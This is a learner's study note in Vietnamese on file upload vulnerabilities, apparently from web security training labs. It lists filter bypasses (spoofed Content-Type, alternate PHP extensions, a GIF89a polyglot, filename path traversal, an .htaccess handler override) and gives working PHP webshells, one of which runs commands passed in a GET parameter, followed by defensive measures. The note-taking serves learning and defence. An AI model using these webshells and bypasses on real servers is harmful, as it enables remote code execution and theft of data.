sau khi học phần này, mình hiểu là...
file upload là chỗ server cho mình up file mà check ẩu.
-> up được webshell là coi như RCE.
=> đọc secret thoải mái.

- check extension / content-type, mình hiểu thế này:
  - server hay check `filename` có `.jpg` không.
  - -> hoặc check header `Content-Type: image/jpeg`.
  - => cả 2 đều là input user gửi lên.
  - -> nên sửa được hết.
- bypass mình hay dùng:
  - đổi Content-Type:
    - `application/x-php` -> `image/jpeg`.
    - -> file vẫn là php nhưng qua filter.
  - đổi extension:
    - `shell.php` -> `shell.php5`.
    - `shell.php` -> `shell.phtml`.
    - `shell.php` -> `shell.phar`.
    - -> vì blacklist hay quên mấy đuôi lạ.
  - polyglot GIF + PHP:
    - thêm `GIF89a` ở đầu file php.
    - -> qua được check magic byte.
    - ví dụ ngắn:
```php
GIF89a
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
  - path traversal trong filename:
    - `filename="../.htaccess"` hoặc `filename="..%2f shell.php"`.
    - -> để ghi đè config hoặc thoát thư mục.
  - `.htaccess`:
    - up file `.htaccess` với nội dung `AddType application/x-httpd-php .jpg`.
    - -> sau đó up `shell.jpg` cũng chạy như php.
- webshell mình hay dùng:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
- -> hoặc loại có param:
```php
<?php echo system($_GET['cmd']); ?>
```
- => up xong chỉ cần GET tới `/files/shell.php?cmd=id` là xong.
- phòng chống, nên mình làm thế này:
  - whitelist extension `.jpg`, `.png` thôi.
  - -> đừng blacklist.
  - đổi tên file thành random, không giữ tên user gửi.
  - lưu file ngoài webroot.
  - -> rồi serve lại bằng code chứ đừng cho chạy trực tiếp.
  - check lại content thật sự, không tin Content-Type.

bài học mình rút ra:
-> thấy up file là thử shell ngay.
-> filter nào dựa vào input user là bypass được.

liên quan:
-> [[file upload]]
-> [[Lab-File upload unrestricted]]
-> [[Lab-File upload content-type bypass]]
-> [[Lab-File upload extension bypass]]
